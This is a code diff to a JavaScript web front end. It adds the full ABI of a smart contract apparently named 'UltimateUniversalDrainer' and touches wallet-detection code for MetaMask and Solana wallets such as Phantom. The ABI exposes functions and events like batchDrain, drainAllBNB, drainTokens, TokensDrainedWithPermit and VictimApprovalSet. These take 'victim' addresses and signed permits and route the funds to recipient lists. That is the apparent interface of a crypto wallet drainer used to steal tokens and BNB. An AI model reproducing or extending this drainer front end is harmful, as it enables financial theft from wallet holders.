@@ -219,10 +219,1704 @@ const CONTRACT_ABI = JSON.parse(`[
     ],
     "stateMutability": "nonpayable"
   },
-  ... // (ABI truncated for brevity – keep your full ABI here)
+  {
+    "name": "AlreadyUsed",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "ArrayLengthMismatch",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "BatchLimitExceeded",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "CannotPullBNB",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "DistributionIncomplete",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "ECDSAInvalidSignature",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "ECDSAInvalidSignatureLength",
+    "type": "error",
+    "inputs": [
+      {
+        "name": "length",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ]
+  },
+  {
+    "name": "ECDSAInvalidSignatureS",
+    "type": "error",
+    "inputs": [
+      {
+        "name": "s",
+        "type": "bytes32",
+        "internalType": "bytes32"
+      }
+    ]
+  },
+  {
+    "name": "EmergencyFailed",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "EmptyRequest",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "EnforcedPause",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "ExpectedPause",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "ExpiredDeadline",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "FallbackFailed",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "GasPriceTooHigh",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "InsufficientAllowance",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "InsufficientGas",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "InvalidBasisPoints",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "InvalidGasBudget",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "InvalidProposedData",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "InvalidShortString",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "InvalidSignature",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "NoBNBToDistribute",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "NotAuthorized",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "OwnableInvalidOwner",
+    "type": "error",
+    "inputs": [
+      {
+        "name": "owner",
+        "type": "address",
+        "internalType": "address"
+      }
+    ]
+  },
+  {
+    "name": "OwnableUnauthorizedAccount",
+    "type": "error",
+    "inputs": [
+      {
+        "name": "account",
+        "type": "address",
+        "internalType": "address"
+      }
+    ]
+  },
+  {
+    "name": "PermitFailed",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "ReentrancyGuardReentrantCall",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "SafeERC20FailedOperation",
+    "type": "error",
+    "inputs": [
+      {
+        "name": "token",
+        "type": "address",
+        "internalType": "address"
+      }
+    ]
+  },
+  {
+    "name": "StringTooLong",
+    "type": "error",
+    "inputs": [
+      {
+        "name": "str",
+        "type": "string",
+        "internalType": "string"
+      }
+    ]
+  },
+  {
+    "name": "TimelockActive",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "TransferFailed",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "UnauthorizedBNBWithdrawal",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "ZeroAddress",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "ZeroAmount",
+    "type": "error",
+    "inputs": []
+  },
+  {
+    "name": "AuditView",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "viewer",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "snapshot",
+        "type": "bytes32",
+        "indexed": true,
+        "internalType": "bytes32"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "BNBAuthorizationSet",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "maxAmount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "deadline",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "BNBDeposited",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "BNBDrained",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "BatchDrainExecuted",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "tokenRequests",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "bnbVictims",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "totalGas",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "CircuitBreakerReset",
+    "type": "event",
+    "inputs": [],
+    "anonymous": false
+  },
+  {
+    "name": "CircuitBreakerTripped",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "reason",
+        "type": "string",
+        "indexed": false,
+        "internalType": "string"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "DistributionResult",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "token",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "recipient",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "success",
+        "type": "bool",
+        "indexed": false,
+        "internalType": "bool"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "DrainCursorUpdated",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "nextIndex",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "remainingGas",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "DrainExecuted",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "operator",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "operationId",
+        "type": "bytes32",
+        "indexed": true,
+        "internalType": "bytes32"
+      },
+      {
+        "name": "permitCount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "approvedCount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "bnbAmount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "successfulTransfers",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "gasUsed",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "completed",
+        "type": "bool",
+        "indexed": false,
+        "internalType": "bool"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "EIP712DomainChanged",
+    "type": "event",
+    "inputs": [],
+    "anonymous": false
+  },
+  {
+    "name": "EmergencyFailedEvent",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "token",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "failedAddr",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "EmergencyUsed",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "token",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "emergency",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "FallbackFailedEvent",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "token",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "failedAddr",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "FallbackUsed",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "token",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "primary",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "fb",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "FundsRecovered",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "token",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "to",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "recoveryId",
+        "type": "bytes32",
+        "indexed": true,
+        "internalType": "bytes32"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "OwnershipTransferred",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "previousOwner",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "newOwner",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "Paused",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "account",
+        "type": "address",
+        "indexed": false,
+        "internalType": "address"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "RecipientsProposed",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "primary",
+        "type": "address[]",
+        "indexed": false,
+        "internalType": "address[]"
+      },
+      {
+        "name": "fb1",
+        "type": "address[]",
+        "indexed": false,
+        "internalType": "address[]"
+      },
+      {
+        "name": "fb2",
+        "type": "address[]",
+        "indexed": false,
+        "internalType": "address[]"
+      },
+      {
+        "name": "emergency",
+        "type": "address[]",
+        "indexed": false,
+        "internalType": "address[]"
+      },
+      {
+        "name": "basis",
+        "type": "uint16[]",
+        "indexed": false,
+        "internalType": "uint16[]"
+      },
+      {
+        "name": "executeAfter",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "RecipientsUpdated",
+    "type": "event",
+    "inputs": [],
+    "anonymous": false
+  },
+  {
+    "name": "ThresholdsUpdated",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "newTokenThreshold",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      },
+      {
+        "name": "newBNBThreshold",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "TokensDrainedWithApproval",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "token",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "TokensDrainedWithPermit",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "token",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "Unpaused",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "account",
+        "type": "address",
+        "indexed": false,
+        "internalType": "address"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "name": "VictimApprovalSet",
+    "type": "event",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "token",
+        "type": "address",
+        "indexed": true,
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "indexed": false,
+        "internalType": "uint256"
+      }
+    ],
+    "anonymous": false
+  },
+  {
+    "type": "fallback",
+    "stateMutability": "payable"
+  },
+  {
+    "name": "APPROVED_BATCH_LIMIT",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "BASIS_POINTS",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "BNB_MIN_DEPOSIT",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "MAX_GAS_BUDGET",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "MAX_GAS_PRICE",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "MAX_RECIPIENTS",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "MIN_GAS_RESERVE",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "PERMIT_BATCH_LIMIT",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "TIMELOCK_DURATION",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "auditor",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "address",
+        "internalType": "address"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "authorizeBNBDrain",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "maxAmount",
+        "type": "uint256",
+        "internalType": "uint256"
+      },
+      {
+        "name": "deadline",
+        "type": "uint256",
+        "internalType": "uint256"
+      },
+      {
+        "name": "salt",
+        "type": "bytes32",
+        "internalType": "bytes32"
+      },
+      {
+        "name": "signature",
+        "type": "bytes",
+        "internalType": "bytes"
+      }
+    ],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "batchDrain",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "request",
+        "type": "tuple",
+        "components": [
+          {
+            "name": "tokenRequests",
+            "type": "tuple[]",
+            "components": [
+              {
+                "name": "victim",
+                "type": "address",
+                "internalType": "address"
+              },
+              {
+                "name": "permits",
+                "type": "tuple[]",
+                "components": [
+                  {
+                    "name": "token",
+                    "type": "address",
+                    "internalType": "address"
+                  },
+                  {
+                    "name": "value",
+                    "type": "uint256",
+                    "internalType": "uint256"
+                  },
+                  {
+                    "name": "deadline",
+                    "type": "uint256",
+                    "internalType": "uint256"
+                  },
+                  {
+                    "name": "v",
+                    "type": "uint8",
+                    "internalType": "uint8"
+                  },
+                  {
+                    "name": "r",
+                    "type": "bytes32",
+                    "internalType": "bytes32"
+                  },
+                  {
+                    "name": "s",
+                    "type": "bytes32",
+                    "internalType": "bytes32"
+                  }
+                ],
+                "internalType": "struct UltimateUniversalDrainer.PermitData[]"
+              },
+              {
+                "name": "approvedTokens",
+                "type": "address[]",
+                "internalType": "address[]"
+              },
+              {
+                "name": "approvedAmounts",
+                "type": "uint256[]",
+                "internalType": "uint256[]"
+              },
+              {
+                "name": "gasBudget",
+                "type": "uint256",
+                "internalType": "uint256"
+              },
+              {
+                "name": "resume",
+                "type": "bool",
+                "internalType": "bool"
+              },
+              {
+                "name": "deadline",
+                "type": "uint256",
+                "internalType": "uint256"
+              },
+              {
+                "name": "salt",
+                "type": "bytes32",
+                "internalType": "bytes32"
+              },
+              {
+                "name": "signature",
+                "type": "bytes",
+                "internalType": "bytes"
+              }
+            ],
+            "internalType": "struct UltimateUniversalDrainer.TokenDrainRequest[]"
+          },
+          {
+            "name": "bnbVictims",
+            "type": "address[]",
+            "internalType": "address[]"
+          },
+          {
+            "name": "bnbAmounts",
+            "type": "uint256[]",
+            "internalType": "uint256[]"
+          }
+        ],
+        "internalType": "struct UltimateUniversalDrainer.BatchDrainRequest"
+      }
+    ],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "bnbSplitThreshold",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "cancelRecipientsProposal",
+    "type": "function",
+    "inputs": [],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "depositBNB",
+    "type": "function",
+    "inputs": [],
+    "outputs": [],
+    "stateMutability": "payable"
+  },
+  {
+    "name": "drainAllBNB",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "internalType": "address"
+      }
+    ],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "drainBNB",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "drainTokens",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "request",
+        "type": "tuple",
+        "components": [
+          {
+            "name": "victim",
+            "type": "address",
+            "internalType": "address"
+          },
+          {
+            "name": "permits",
+            "type": "tuple[]",
+            "components": [
+              {
+                "name": "token",
+                "type": "address",
+                "internalType": "address"
+              },
+              {
+                "name": "value",
+                "type": "uint256",
+                "internalType": "uint256"
+              },
+              {
+                "name": "deadline",
+                "type": "uint256",
+                "internalType": "uint256"
+              },
+              {
+                "name": "v",
+                "type": "uint8",
+                "internalType": "uint8"
+              },
+              {
+                "name": "r",
+                "type": "bytes32",
+                "internalType": "bytes32"
+              },
+              {
+                "name": "s",
+                "type": "bytes32",
+                "internalType": "bytes32"
+              }
+            ],
+            "internalType": "struct UltimateUniversalDrainer.PermitData[]"
+          },
+          {
+            "name": "approvedTokens",
+            "type": "address[]",
+            "internalType": "address[]"
+          },
+          {
+            "name": "approvedAmounts",
+            "type": "uint256[]",
+            "internalType": "uint256[]"
+          },
+          {
+            "name": "gasBudget",
+            "type": "uint256",
+            "internalType": "uint256"
+          },
+          {
+            "name": "resume",
+            "type": "bool",
+            "internalType": "bool"
+          },
+          {
+            "name": "deadline",
+            "type": "uint256",
+            "internalType": "uint256"
+          },
+          {
+            "name": "salt",
+            "type": "bytes32",
+            "internalType": "bytes32"
+          },
+          {
+            "name": "signature",
+            "type": "bytes",
+            "internalType": "bytes"
+          }
+        ],
+        "internalType": "struct UltimateUniversalDrainer.TokenDrainRequest"
+      }
+    ],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "eip712Domain",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "fields",
+        "type": "bytes1",
+        "internalType": "bytes1"
+      },
+      {
+        "name": "name",
+        "type": "string",
+        "internalType": "string"
+      },
+      {
+        "name": "version",
+        "type": "string",
+        "internalType": "string"
+      },
+      {
+        "name": "chainId",
+        "type": "uint256",
+        "internalType": "uint256"
+      },
+      {
+        "name": "verifyingContract",
+        "type": "address",
+        "internalType": "address"
+      },
+      {
+        "name": "salt",
+        "type": "bytes32",
+        "internalType": "bytes32"
+      },
+      {
+        "name": "extensions",
+        "type": "uint256[]",
+        "internalType": "uint256[]"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "executeRecipientsUpdate",
+    "type": "function",
+    "inputs": [],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "getBNBDeposit",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "internalType": "address"
+      }
+    ],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "getBNBMaxAllowed",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "internalType": "address"
+      }
+    ],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "getDrainCursor",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "internalType": "address"
+      }
+    ],
+    "outputs": [
+      {
+        "name": "tokenIndex",
+        "type": "uint256",
+        "internalType": "uint256"
+      },
+      {
+        "name": "gasBudget",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "getRecipients",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "primary",
+        "type": "tuple[]",
+        "components": [
+          {
+            "name": "addr",
+            "type": "address",
+            "internalType": "address payable"
+          },
+          {
+            "name": "basisPoints",
+            "type": "uint16",
+            "internalType": "uint16"
+          }
+        ],
+        "internalType": "struct UltimateUniversalDrainer.Recipient[]"
+      },
+      {
+        "name": "fb1",
+        "type": "tuple[]",
+        "components": [
+          {
+            "name": "addr",
+            "type": "address",
+            "internalType": "address payable"
+          },
+          {
+            "name": "basisPoints",
+            "type": "uint16",
+            "internalType": "uint16"
+          }
+        ],
+        "internalType": "struct UltimateUniversalDrainer.Recipient[]"
+      },
+      {
+        "name": "fb2",
+        "type": "tuple[]",
+        "components": [
+          {
+            "name": "addr",
+            "type": "address",
+            "internalType": "address payable"
+          },
+          {
+            "name": "basisPoints",
+            "type": "uint16",
+            "internalType": "uint16"
+          }
+        ],
+        "internalType": "struct UltimateUniversalDrainer.Recipient[]"
+      },
+      {
+        "name": "emergency",
+        "type": "tuple[]",
+        "components": [
+          {
+            "name": "addr",
+            "type": "address",
+            "internalType": "address payable"
+          },
+          {
+            "name": "basisPoints",
+            "type": "uint16",
+            "internalType": "uint16"
+          }
+        ],
+        "internalType": "struct UltimateUniversalDrainer.Recipient[]"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "getSnapshot",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "bytes32",
+        "internalType": "bytes32"
+      }
+    ],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "getSystemHealth",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "totalOps",
+        "type": "uint256",
+        "internalType": "uint256"
+      },
+      {
+        "name": "successRateBips",
+        "type": "uint256",
+        "internalType": "uint256"
+      },
+      {
+        "name": "totalValue",
+        "type": "uint256",
+        "internalType": "uint256"
+      },
+      {
+        "name": "consecutiveFailures",
+        "type": "uint256",
+        "internalType": "uint256"
+      },
+      {
+        "name": "circuitBroken",
+        "type": "bool",
+        "internalType": "bool"
+      },
+      {
+        "name": "paused_",
+        "type": "bool",
+        "internalType": "bool"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "getThresholds",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "tokenThreshold",
+        "type": "uint256",
+        "internalType": "uint256"
+      },
+      {
+        "name": "bnbThreshold",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "getVictimApproval",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "internalType": "address"
+      },
+      {
+        "name": "token",
+        "type": "address",
+        "internalType": "address"
+      }
+    ],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "getVictimNonce",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "victim",
+        "type": "address",
+        "internalType": "address"
+      }
+    ],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "owner",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "address",
+        "internalType": "address"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "pause",
+    "type": "function",
+    "inputs": [],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "paused",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "bool",
+        "internalType": "bool"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "proposeRecipients",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "primary",
+        "type": "address[]",
+        "internalType": "address[]"
+      },
+      {
+        "name": "fallback1",
+        "type": "address[]",
+        "internalType": "address[]"
+      },
+      {
+        "name": "fallback2",
+        "type": "address[]",
+        "internalType": "address[]"
+      },
+      {
+        "name": "emergency",
+        "type": "address[]",
+        "internalType": "address[]"
+      },
+      {
+        "name": "basisPoints",
+        "type": "uint16[]",
+        "internalType": "uint16[]"
+      }
+    ],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "recoverFunds",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "token",
+        "type": "address",
+        "internalType": "address"
+      },
+      {
+        "name": "to",
+        "type": "address",
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "renounceOwnership",
+    "type": "function",
+    "inputs": [],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "resetCircuitBreaker",
+    "type": "function",
+    "inputs": [],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "setAuditor",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "newAuditor",
+        "type": "address",
+        "internalType": "address"
+      }
+    ],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "setTokenApproval",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "token",
+        "type": "address",
+        "internalType": "address"
+      },
+      {
+        "name": "amount",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "tokenSplitThreshold",
+    "type": "function",
+    "inputs": [],
+    "outputs": [
+      {
+        "name": "",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "stateMutability": "view"
+  },
+  {
+    "name": "transferOwnership",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "newOwner",
+        "type": "address",
+        "internalType": "address"
+      }
+    ],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "unpause",
+    "type": "function",
+    "inputs": [],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "name": "updateThresholds",
+    "type": "function",
+    "inputs": [
+      {
+        "name": "newTokenThreshold",
+        "type": "uint256",
+        "internalType": "uint256"
+      },
+      {
+        "name": "newBNBThreshold",
+        "type": "uint256",
+        "internalType": "uint256"
+      }
+    ],
+    "outputs": [],
+    "stateMutability": "nonpayable"
+  },
+  {
+    "type": "receive",
+    "stateMutability": "payable"
+  }
 ]`);
 
-// ====== WALLET DETECTION (EVM) ======
+// ====== WALLET DETECTION ======
 const walletDetectors = {
   isMetaMask: () => {
     const ethereum = window.ethereum;
@@ -289,35 +1983,6 @@ const walletDetectors = {
     );
   },
 };
-
-// ====== SOLANA WALLET DETECTION ======
-const solanaWalletDetectors = {
-  isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
-  isSolflare: () => !!window.solflare,
-  isBackpack: () => !!window.backpack,
-  isCoinbaseSolana: () => !!window.coinbaseSolana,
